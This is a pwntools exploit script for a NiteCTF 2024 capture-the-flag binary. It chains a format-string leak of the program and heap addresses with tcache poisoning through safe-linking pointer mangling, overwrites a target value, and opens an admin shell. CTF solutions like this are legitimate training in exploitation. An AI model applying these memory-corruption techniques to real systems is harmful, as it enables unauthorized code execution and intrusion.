#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "chaterine.chals.nitectf2024.live", 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def malloc(idx, size):
    io.sendlineafter(">>", "1")
    io.sendlineafter("Enter index:", str(idx).encode())
    io.sendlineafter("Enter size:", str(size).encode())

def free(idx):
    io.sendlineafter(">>", "2")
    io.sendlineafter("Enter index:", str(idx).encode())

def edit(idx, input):
    io.sendlineafter(">>", "3")
    io.sendlineafter("Enter index:", str(idx).encode())
    io.sendline(input)

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val


# https://github.com/rerrorctf/writeups/blob/main/2024_12_13_NiteCTF24/pwn/print_the_gifts/writeup.md
def exploit(i):
    global io
    io = initialize()
    io.sendline("%17$p%p")
    io.recvuntil("Hello ")
    leak = io.recvline().decode().split("0x")
    main = int("0x"+leak[1],16)
    target = int("0x"+leak[2],16) + i
    elf.address = main - elf.sym["main"]
    malloc(0, 0x40)
    edit(0, "%3$p")
    heap = (int(io.recvline().strip(),16) >> 12) << 12

    log.info("Main: %#x", main)
    log.info("Target: %#x", target)
    log.info("Elf base: %#x", elf.address)
    log.info("Heap base: %#x", heap) 
    malloc(1, 0x40)
    free(0)
    free(1)
    edit(1, p64(mangle(heap, target)))
    malloc(2, 0x40)
    malloc(3, 0x40)
    edit(3, "spiderdrive")
    io.sendlineafter(">>", "4")
    if b"admin" in io.recv():
      print(hex(i))
      io.interactive()
    
if __name__ == '__main__':
    exploit(0x2130)
